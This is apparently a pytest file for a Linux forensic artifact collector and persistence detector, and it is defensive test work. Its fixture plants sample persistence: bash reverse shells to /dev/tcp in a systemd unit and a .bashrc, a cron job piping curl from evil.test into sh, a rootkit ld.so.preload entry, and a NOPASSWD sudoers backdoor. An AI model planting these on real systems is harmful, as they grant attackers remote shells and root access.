"""Tests for the Linux artifact collector (SFE-4fnv.5).

Builds a synthetic mounted-image root exercising all five persistence surfaces
and asserts that ``collect_linux_artifacts`` produces the exact detector
contract, and that piping the result through ``LinuxPersistenceDetector``
yields one finding per malicious surface with zero false positives on the
benign entries laid alongside them.
"""

from __future__ import annotations

from pathlib import Path

from sift_find_evil.detectors import LinuxPersistenceDetector
from sift_find_evil.parsers import collect_linux_artifacts


def _write(path: Path, content: str) -> None:
    """Create parent dirs and write ``content`` to ``path``."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _build_malicious_root(root: Path) -> None:
    """Populate ``root`` with one malicious + one benign entry per surface."""
    # systemd: malicious reverse-shell unit + benign unit.
    _write(
        root / "etc/systemd/system/evil.service",
        "[Service]\nExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    )
    _write(
        root / "lib/systemd/system/good.service",
        "[Service]\nExecStart=/usr/bin/mydaemon --serve\n",
    )
    # cron: malicious curl|sh in cron.d + benign user crontab.
    _write(
        root / "etc/cron.d/persist",
        "* * * * * root curl http://evil.test/x | sh\n",
    )
    _write(
        root / "var/spool/cron/crontabs/alice",
        "0 2 * * * /usr/bin/backup.sh\n",
    )
    # ld.so.preload: object outside standard lib paths.
    _write(root / "etc/ld.so.preload", "/tmp/rootkit.so\n")
    # sudoers: NOPASSWD:ALL backdoor for a non-system principal + benign wheel.
    _write(
        root / "etc/sudoers",
        "Defaults env_reset\n%wheel ALL=(ALL) NOPASSWD:ALL\n"
        "attacker ALL=(ALL) NOPASSWD:ALL\n",
    )
    # shell-init: reverse shell in a user .bashrc + benign export.
    _write(
        root / "home/alice/.bashrc",
        "export EDITOR=vim\nbash -i >& /dev/tcp/10.0.0.2/9001 0>&1\n",
    )


def test_collect_returns_full_detector_contract(tmp_path: Path) -> None:
    root = tmp_path / "mnt"
    _build_malicious_root(root)

    artifacts = collect_linux_artifacts(root)

    assert set(artifacts) == {
        "systemd_units",
        "cron_entries",
        "ld_preload",
        "sudoers",
        "bashrc_entries",
        "auth_events",
        "shell_history",
        "login_sessions",
        "proc_processes",
    }
    assert isinstance(artifacts["ld_preload"], str)
    for key in (
        "systemd_units",
        "cron_entries",
        "sudoers",
        "bashrc_entries",
        "auth_events",
        "shell_history",
        "login_sessions",
        "proc_processes",
    ):
        assert isinstance(artifacts[key], list)


def test_collected_root_fires_one_finding_per_surface(tmp_path: Path) -> None:
    root = tmp_path / "mnt"
    _build_malicious_root(root)

    artifacts = collect_linux_artifacts(root)
    findings = LinuxPersistenceDetector().analyze(artifacts)

    techniques = sorted(f.evidence["mitre_technique"] for f in findings)
    # One finding per surface: systemd, cron, ld.so.preload, sudoers, shell-init.
    assert techniques == [
        "T1053.003",
        "T1543.002",
        "T1546.004",
        "T1548.003",
        "T1574.006",
    ]


def test_empty_root_yields_no_findings(tmp_path: Path) -> None:
    root = tmp_path / "empty"
    root.mkdir()

    artifacts = collect_linux_artifacts(root)

    assert artifacts["ld_preload"] == ""
    assert LinuxPersistenceDetector().analyze(artifacts) == []


def test_benign_root_is_clean(tmp_path: Path) -> None:
    """A root with only benign entries produces zero findings (precision)."""
    root = tmp_path / "mnt"
    _write(
        root / "lib/systemd/system/good.service",
        "[Service]\nExecStart=/usr/bin/mydaemon --serve\n",
    )
    _write(root / "var/spool/cron/crontabs/alice", "0 2 * * * /usr/bin/backup.sh\n")
    _write(root / "etc/sudoers", "%wheel ALL=(ALL) NOPASSWD:ALL\n")
    _write(root / "home/alice/.bashrc", "export EDITOR=vim\n")

    artifacts = collect_linux_artifacts(root)

    assert LinuxPersistenceDetector().analyze(artifacts) == []
